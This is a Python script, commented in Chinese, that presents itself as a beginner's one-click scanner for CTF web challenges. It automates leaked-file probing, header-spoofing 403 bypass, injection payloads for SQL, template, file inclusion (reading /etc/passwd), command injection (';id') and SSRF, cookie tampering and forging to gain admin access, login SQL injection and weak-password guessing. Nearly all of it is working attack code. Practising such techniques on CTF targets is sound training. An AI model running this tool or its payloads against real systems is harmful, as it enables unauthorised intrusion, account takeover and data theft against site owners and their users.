# -*- coding: utf-8 -*-
"""webaudit —— 新手友好的 Web 题一键体检 / 自动找线索

用法:
    python webaudit.py http://127.0.0.1:18080/
    python webaudit.py http://靶机:端口/ --deep

做的事（每一步都会打印"为什么"）:
  1. 抓首页：源码注释、JS、链接、响应头、Cookie
  2. 探常见泄露文件：robots.txt / .git / .env / 备份 / www.zip / phpinfo ...
  3. 爬同站链接（最多 40 个）并扫描 flag / 隐藏注释 / base64
  4. 对 URL 参数做安全探测：SQL 注入 / SSTI / LFI / 命令注入 / SSRF / 路径穿越
  5. 试常见弱口令登录（admin/admin 等）
  6. 汇总：发现了什么、下一步手动做什么
"""
import sys, re, os, json, base64, urllib.parse, urllib.request, urllib.error, http.cookiejar, html

FLAG_RE = re.compile(r'(?:C404|flag|ctf|FLAG|CTF)\{[^}\n]{2,120}\}')
MAXB = 2_000_000

PATHS = [
    'robots.txt', '.git/HEAD', '.git/config', '.env', '.svn/entries', '.DS_Store',
    'www.zip', 'backup.zip', 'site.zip', 'source.zip', 'web.zip', 'html.zip',
    'index.php.bak', 'index.php~', 'index.php.swp', '.index.php.swp', 'index.php.old',
    'config.php.bak', 'config.php~', 'backup.sql', 'db.sql', 'dump.sql',
    'flag.txt', 'flag.php', 'flag', 'phpinfo.php', 'info.php', 'test.php',
    'admin/', 'login/', 'upload/', 'api/', 'api/flag', 'server-status',
    'README.md', 'readme.txt', 'package.json', 'composer.json', 'Dockerfile',
    'docker-compose.yml', '.idea/workspace.xml', '.vscode/settings.json', 'web.config',
    'sitemap.xml', 'crossdomain.xml', '.well-known/security.txt', 'source', 'src',
]

class C:
    def __init__(self, base, deep=False):
        self.base = base.rstrip('/')
        self.root = urllib.parse.urlparse(self.base)
        self.deep = deep
        self.cj = http.cookiejar.CookieJar()
        self.op = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(self.cj))
        self.hits = []      # (类型, URL, 说明)
        self.extra_cookies = {}
        self.flags = {}     # flag -> 来源
        self.urls = set([self.base + '/'])
        self.params = {}

    def req(self, url, data=None, headers=None, method=None, timeout=8):
        hdrs = dict(headers or {})
        if self.extra_cookies:
            ck = '; '.join('%s=%s' % (k, v) for k, v in self.extra_cookies.items())
            hdrs['Cookie'] = (hdrs.get('Cookie', '') + '; ' + ck).strip('; ')
        try:
            r = urllib.request.Request(url, data=data, headers=hdrs, method=method)
            with self.op.open(r, timeout=timeout) as f:
                return f.status, dict(f.headers), f.read(MAXB)
        except urllib.error.HTTPError as e:
            try: return e.code, dict(e.headers), e.read(MAXB)
            except Exception: return e.code, dict(e.headers), b''
        except Exception as e:
            return 0, {}, str(e).encode('utf-8', 'replace')

    def add(self, kind, url, note):
        self.hits.append((kind, url, note))

    def scan(self, body, url, where=''):
        try: t = body.decode('utf-8', 'replace')
        except Exception: t = ''
        for m in FLAG_RE.finditer(t):
            self.flags.setdefault(m.group(0), url + (' ' + where if where else ''))
        # HTML 注释（顺便从注释里抠出 /路径）
        for m in re.finditer(r'<!--(.*?)-->', t, re.S):
            c = m.group(1).strip()
            if c and not c.startswith('[') and len(c) < 400:
                self.add('注释', url, c[:200])
                for pth in re.findall(r'(/[A-Za-z0-9_./?=&-]{2,80})', c):
                    self.urls.add(urllib.parse.urljoin(self.base + '/', pth))
        # JWT：解码 payload 看有没有 flag / 管理员字段
        for m in re.finditer(r'eyJ[A-Za-z0-9_-]{5,}\.[A-Za-z0-9_-]{5,}\.[A-Za-z0-9_-]*', t):
            tok = m.group(0)
            try:
                parts = tok.split('.')
                pl = parts[1] + '=' * (-len(parts[1]) % 4)
                payload = base64.urlsafe_b64decode(pl).decode('utf-8', 'replace')
                self.add('JWT', url, payload[:200])
                for fm in FLAG_RE.finditer(payload):
                    self.flags.setdefault(fm.group(0), 'JWT ' + url)
            except Exception:
                pass
        # JS 里的接口/硬编码
        for m in re.finditer(r'''(?:fetch|axios\.(?:get|post)|url)\s*[=(]\s*['"]([^'"]{2,120})['"]''', t):
            self.add('JS接口', url, m.group(1))
        return t

    def get(self, url, **kw):
        st, hd, body = self.req(url, **kw)
        if st:
            self.scan(body, url)
        return st, hd, body

    # ---------- 1. 首页 ----------
    def home(self):
        st, hd, body = self.get(self.base + '/')
        print('  [1] 首页: HTTP %s, %d 字节' % (st, len(body)))
        for k in ('Server', 'X-Powered-By', 'Set-Cookie', 'Content-Type', 'Access-Control-Allow-Origin'):
            if k in hd:
                print('      响应头 %-12s: %s' % (k, hd[k][:100]))
                if k == 'Access-Control-Allow-Origin' and hd[k].strip() == '*':
                    self.add('CORS', self.base + '/', 'Access-Control-Allow-Origin: *（可能能跨域读数据）')
                if k in ('Server', 'X-Powered-By'):
                    self.add('指纹', self.base + '/', hd[k][:100])
        t = body.decode('utf-8', 'replace')
        for m in re.finditer(r'(?:href|src|action)=["\']([^"\']+)["\']', t, re.I):
            u = urllib.parse.urljoin(self.base + '/', html.unescape(m.group(1)))
            if urllib.parse.urlparse(u).netloc == self.root.netloc:
                self.urls.add(u)
        # 参数收集
        for u in list(self.urls):
            q = urllib.parse.parse_qs(urllib.parse.urlparse(u).query)
            for k, v in q.items():
                self.params.setdefault(k, (u, v[0]))
        # Cookie
        for ck in self.cj:
            print('      Cookie %s = %s' % (ck.name, ck.value))
            self.add('Cookie', ck.name, ck.value[:120])
            for dec in (lambda s: base64.b64decode(s + '=' * (-len(s) % 4)), urllib.parse.unquote):
                try:
                    v = dec(ck.value).decode('utf-8')
                    if v and v != ck.value:
                        self.add('Cookie解码', ck.name, v[:150])
                        for m in FLAG_RE.finditer(v): self.flags.setdefault(m.group(0), 'Cookie ' + ck.name)
                except Exception:
                    pass

    # ---------- 2. 探路径 ----------
    def probe(self):
        print('  [2] 探常见泄露文件（%d 个路径）...' % len(PATHS))
        for p in PATHS:
            u = self.base + '/' + p
            st, hd, body = self.req(u, timeout=5)
            if st in (200, 401, 403) and len(body) < MAXB:
                ct = hd.get('Content-Type', '')
                note = 'HTTP %d, %d 字节, %s' % (st, len(body), ct[:40])
                if st == 200:
                    self.scan(body, u)
                    if p == 'robots.txt':
                        for dm in re.finditer(r'(?im)^\s*Disallow:\s*(\S+)', body.decode('utf-8', 'replace')):
                            self.urls.add(urllib.parse.urljoin(self.base + '/', dm.group(1)))
                            self.add('robots', u, 'Disallow: ' + dm.group(1))
                    if 'zip' in ct or p.endswith(('.zip', '.sql', '.db')):
                        out = os.path.join(os.environ.get('TEMP', '.'), 'web_' + os.path.basename(p))
                        open(out, 'wb').write(body)
                        self.scan(body, u, '下载文件')
                        self.add('下载', u, note + ' -> ' + out)
                    else:
                        self.add('疑似泄露', u, note)
                else:
                    self.add('存在(需权限)', u, note)
                    if st == 403:
                        for hk, hv in (('X-Forwarded-For', '127.0.0.1'), ('X-Real-IP', '127.0.0.1'), ('Client-IP', '127.0.0.1')):
                            st2, hd2, b2 = self.req(u, headers={hk: hv}, timeout=5)
                            if st2 == 200:
                                self.scan(b2, u, '伪造头 ' + hk)
                                self.add('伪造头绕过', u, '%s: %s -> HTTP 200' % (hk, hv))
                                break
        if self.deep:
            # 简单目录爆破
            for d in ('admin', 'login', 'upload', 'api', 'test', 'dev', 'backup', 'old', 'phpmyadmin', 'console'):
                u = self.base + '/' + d + '/'
                st, hd, body = self.req(u, timeout=4)
                if st in (200, 301, 302, 403):
                    self.add('目录', u, 'HTTP %d' % st)

    # ---------- 3. 爬 ----------
    def crawl(self):
        print('  [3] 爬同站链接 ...')
        todo = [u for u in self.urls if u not in getattr(self, '_done', set())]
        done = getattr(self, '_done', set())
        n = 0
        while todo and n < 40:
            u = todo.pop(0)
            if u in done: continue
            done.add(u); n += 1
            st, hd, body = self.get(u)
            if st == 200:
                t = body.decode('utf-8', 'replace')
                for m in re.finditer(r'(?:href|src|action)=["\']([^"\']+)["\']', t, re.I):
                    nu = urllib.parse.urljoin(u, html.unescape(m.group(1)))
                    if urllib.parse.urlparse(nu).netloc == self.root.netloc and nu not in done:
                        todo.append(nu)
                for m in re.finditer(r'/api/[A-Za-z0-9_/.-]+', t):
                    self.add('接口', u, m.group(0))
        self._done = done
        print('      访问了 %d 个页面' % n)

    # ---------- 4. 参数探测 ----------
    def test_params(self):
        print('  [4] 参数安全探测 ...')
        payloads = [
            ("'", 'SQL注入', ['sql syntax', 'mysql', 'sqlite', 'ora-', 'you have an error', 'unclosed']),
            ("' OR '1'='1", 'SQL注入', ['sql syntax', 'mysql', 'ora-']),
            ('{{7*7}}', 'SSTI', ['49']),
            ('${7*7}', 'SSTI', ['49']),
            ('../../../../etc/passwd', 'LFI', ['root:x:', 'daemon:']),
            ('../../flag.txt', '路径穿越', []),
            (';id', '命令注入', ['uid=', 'gid=']),
            ('|id', '命令注入', ['uid=', 'gid=']),
            ('file:///etc/passwd', 'SSRF', ['root:x:', 'internal']),
            ('http://127.0.0.1/', 'SSRF', ['internal', 'localhost']),
        ]
        for name, (sample_url, val) in self.params.items():
            try:
                st0, hd0, b0 = self.req(sample_url, timeout=6)
                base_len = len(b0)
            except Exception:
                base_len = 0
            for pay, kind, sigs in payloads:
                u = sample_url
                q = urllib.parse.parse_qs(urllib.parse.urlparse(u).query)
                q[name] = [pay]
                newq = urllib.parse.urlencode(q, doseq=True)
                nu = urllib.parse.urlunparse(urllib.parse.urlparse(u)._replace(query=newq))
                st, hd, body = self.req(nu, timeout=6)
                t = body.decode('utf-8', 'replace')
                hit = any(s.lower() in t.lower() for s in sigs)
                flag_here = bool(FLAG_RE.search(t)) and not bool(FLAG_RE.search(b0.decode('utf-8', 'replace')))
                if hit or flag_here:
                    self.add(kind, nu, '参数 %s 注入 %r 后%s' % (name, pay, '直接出现 flag' if flag_here else '命中特征'))
                elif kind == 'SQL注入' and abs(len(body) - base_len) > max(20, base_len * 0.3):
                    self.add('SQL注入?', nu, '参数 %s 注入 %r 后响应长度 %d -> %d（疑似）' % (name, pay, base_len, len(body)))
                self.scan(body, nu, '参数' + name)

    # ---------- 4.5 Cookie 篡改 ----------
    def cookie_tamper(self):
        print('  [4.5] Cookie 篡改（role/admin=1）...')
        names = [ck.name for ck in self.cj]
        for nm in ('role', 'admin', 'is_admin', 'isadmin', 'user', 'type', 'auth'):
            if nm not in names: names.append(nm)
        for u in (self.base + '/admin/', self.base + '/admin', self.base + '/flag', self.base + '/profile'):
            self.extra_cookies = {}
            st0, hd0, b0 = self.req(u)
            for nm in names:
                for v in ('admin', '1', 'true', 'True', 'administrator'):
                    self.extra_cookies = {nm: v}
                    st, hd, body = self.req(u)
                    t = body.decode('utf-8', 'replace')
                    if st == 200 and st0 != 200 and (FLAG_RE.search(t) or 'admin' in t.lower()):
                        self.scan(body, u, 'Cookie %s=%s' % (nm, v))
                        self.add('Cookie篡改', u, '%s=%s: HTTP %s -> 200' % (nm, v, st0))
                        break
        self.extra_cookies = {}

    def cookie_forge(self):
        print('  [4.6] Cookie 结构分析（base64 JSON / pickle / 伪造 admin）...')
        for ck in list(self.cj):
            raw = ck.value
            dec = None
            for f in (lambda x: base64.b64decode(x + '=' * (-len(x) % 4)),
                      urllib.parse.unquote):
                try:
                    d = f(raw)
                    if isinstance(d, bytes): d = d.decode('utf-8', 'replace')
                    if d.strip(): dec = d; break
                except Exception:
                    pass
            if not dec:
                continue
            if dec.startswith('{') and '"' in dec:
                self.add('Cookie结构', ck.name, 'base64/JSON: ' + dec[:160])
                try:
                    obj = json.loads(dec)
                except Exception:
                    obj = None
                if isinstance(obj, dict):
                    for k in list(obj.keys()):
                        if k.lower() in ('username', 'user', 'name', 'account'):
                            obj[k] = 'admin'
                        elif k.lower() in ('role', 'isadmin', 'is_admin', 'admin'):
                            obj[k] = 'admin'
                    forged = base64.b64encode(json.dumps(obj).encode()).decode()
                    self.extra_cookies[ck.name] = forged
                    for u in (self.base + '/admin/', self.base + '/', self.base + '/profile'):
                        st, hd, body = self.req(u)
                        t = body.decode('utf-8', 'replace')
                        if st == 200 and (FLAG_RE.search(t) or 'admin' in t.lower()):
                            self.scan(body, u, '伪造Cookie ' + ck.name)
                            self.add('Cookie伪造', u, '%s 解 base64 JSON 改成 admin 后 HTTP 200' % ck.name)
                            break
                    self.extra_cookies = {}
            elif dec.startswith('\x80') or raw.startswith('gAS'):
                self.add('Cookie结构', ck.name, '疑似 pickle 序列化（反序列化漏洞常见）: ' + raw[:80])

    # ---------- 5. 弱口令 ----------
    def login(self):
        print('  [5] 尝试常见弱口令 / 登录 SQL 注入 ...')
        # 找登录表单
        st, hd, body = self.get(self.base + '/')
        t = body.decode('utf-8', 'replace')
        forms = re.findall(r'<form[^>]*action=["\']([^"\']*)["\'][^>]*>(.*?)</form>', t, re.S | re.I)
        targets = [(urllib.parse.urljoin(self.base + '/', a or self.base + '/'), f) for a, f in forms]
        targets += [(self.base + '/login', ''), (self.base + '/user/login', ''),
                    (self.base + '/admin/login', ''), (self.base + '/signin', ''),
                    (self.base + '/api/login', ''), (self.base + '/admin/', '')]
        for u in list(self.urls):
            if re.search(r'(?i)login|signin', u):
                targets.append((u, ''))
        creds = [('admin', 'admin'), ('admin', '123456'), ('admin', 'password'), ('root', 'root'), ('test', 'test')]
        for action, form in targets:
            names = re.findall(r'<input[^>]*name=["\']([^"\']+)["\']', form, re.I)
            ufield = next((n for n in names if n.lower() in ('user', 'username', 'name', 'account', 'uname')), 'user')
            pfield = next((n for n in names if n.lower() in ('pass', 'password', 'pwd', 'passwd')), 'pass')
            # 先试登录 SQL 注入（用户名处闭合引号）
            for sq in ("' OR 1=1 -- ", "admin' -- ", "' OR '1'='1' -- "):
                data = urllib.parse.urlencode({ufield: sq, pfield: 'x'}).encode()
                st, hd, body = self.req(action, data=data, headers={'Content-Type': 'application/x-www-form-urlencoded'})
                tt = body.decode('utf-8', 'replace')
                if st == 200 and not re.search(r'(?i)bad login|incorrect|失败|错误|invalid', tt) and (
                        FLAG_RE.search(tt) or re.search(r'(?i)welcome|logout|admin', tt)):
                    self.add('登录SQL注入', action, '用户名 %r 直接登录成功' % sq)
                    self.scan(body, action, '登录SQLi')
                    break
            for uu, pp in creds:
                data = urllib.parse.urlencode({ufield: uu, pfield: pp}).encode()
                st, hd, body = self.req(action, data=data, headers={'Content-Type': 'application/x-www-form-urlencoded'})
                tt = body.decode('utf-8', 'replace')
                if st == 200 and not re.search(r'(?i)bad login|incorrect|失败|错误|invalid', tt):
                    self.scan(body, action, '弱口令 %s/%s' % (uu, pp))
                    # 看 cookie 有没有变成管理员
                    if FLAG_RE.search(tt) or any(k in tt for k in ('welcome', 'admin', 'success')):
                        self.add('弱口令', action, '%s / %s' % (uu, pp))
                    # 用新 cookie 再访问 /admin/
                    st2, hd2, b2 = self.req(self.base + '/admin/')
                    self.scan(b2, self.base + '/admin/', '登录后')
                    break
        self.cookie_forge()

    # ---------- 报告 ----------
    def report(self):
        print()
        print('  ' + '=' * 62)
        print('  ◆ 扫描结果')
        print('  ' + '=' * 62)
        if self.flags:
            print('  ★ 找到疑似 flag：')
            for f, src in self.flags.items(): print('     %s   ← %s' % (f, src))
        else:
            print('  没直接扫到 flag（不代表没洞，见下面）')
        if self.hits:
            print('  ◆ 线索 / 可能的漏洞点：')
            seen = set()
            for kind, url, note in self.hits:
                key = (kind, url, note)
                if key in seen: continue
                seen.add(key)
                print('     [%s] %s' % (kind, url))
                print('        %s' % note[:160])
        else:
            print('  没有发现明显泄露/漏洞特征')
        print()
        print('  ◆ 下一步（按顺序试）')
        print('     1. 浏览器 F12 → Network / Application / Sources 再看一遍')
        print('     2. 上面"疑似泄露"的 URL 逐个打开，flag 常在 .env / 备份 / 注释里')
        print('     3. 有登录框 → 试弱口令；有 Cookie → 改 role/admin=1 再刷新')
        print('     4. 有参数 → 把 ?id=1 改成 ?id=1\' 看报错；试 {{7*7}} 看有没有 49')
        print('     5. 还不行 → 用 tools 里的 dirsearch/ffuf 大字典继续扫')

def main():
    if len(sys.argv) < 2:
        print('用法: python webaudit.py http://靶机:端口/ [--deep]')
        return
    base = sys.argv[1]
    if not re.match(r'https?://', base): base = 'http://' + base
    c = C(base, '--deep' in sys.argv)
    print('目标:', c.base)
    c.home()
    c.probe()
    c.crawl()
    c.test_params()
    c.cookie_tamper()
    c.login()
    c.report()

if __name__ == '__main__':
    main()
